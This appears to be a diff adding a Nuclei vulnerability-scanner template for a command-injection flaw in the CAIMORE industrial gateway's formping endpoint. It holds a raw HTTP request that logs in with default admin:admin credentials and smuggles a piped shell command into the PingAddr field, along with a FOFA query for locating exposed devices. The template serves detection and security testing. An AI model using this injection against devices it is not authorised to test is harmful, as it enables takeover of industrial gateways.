@@ -1,0 +1,50 @@
+id: caimore-gateway-rce
+
+info:
+  name: CAIMORE Gateway - Remote Code Execution
+  author: momika233
+  severity: high
+  description: |
+    The gateway of Xiamen Caimao Communication Technology Co., Ltd. is designed with open software architecture. It is a metal shell design, with two Ethernet RJ45 interfaces, and an industrial design wireless gateway using 3G/4G/5G wide area network for Internet communication. There is a command execution vulnerability in the formping file of the gateway of Xiamen Caimao Communication Technology Co., Ltd. An attacker can use this vulnerability to arbitrarily execute code on the server side, write to the back door, obtain server permissions, and then control the entire web server.
+  reference:
+    - https://www.ctfiot.com/126482.html
+  classification:
+    cwe-id: CWE-78
+  metadata:
+    max-request: 2
+    fofa-query: app="CAIMORE-Gateway"
+  tags: ciamore-gateway,rce,authenticated,intrusive,vuln
+
+http:
+  - raw:
+      - |
+        POST /goform/formping HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic {{base64(username + ':' + password)}}
+        Accept-Encoding: gzip
+
+        PingAddr=127.0.0.1%7Cecho%20{{randstr}}&PingPackNumb=1&PingMsg=
+      - |
+        GET /pingmessages HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic {{base64(username + ':' + password)}}
+        Accept-Encoding: gzip
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - admin
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - "{{randstr}}"
+
+      - type: status
+        status:
+          - 200
+# digest: 490a00463044022047b7be7336615c9dcf23b880a398cdb4f733b44ae4c7b4cfbcaa9e63febc9d6202200c3169db202af4772c95a149c82412a3110dfb7f314f1457b58cbd717e4f608c:922c64590222798bb761d5b6d8e72950
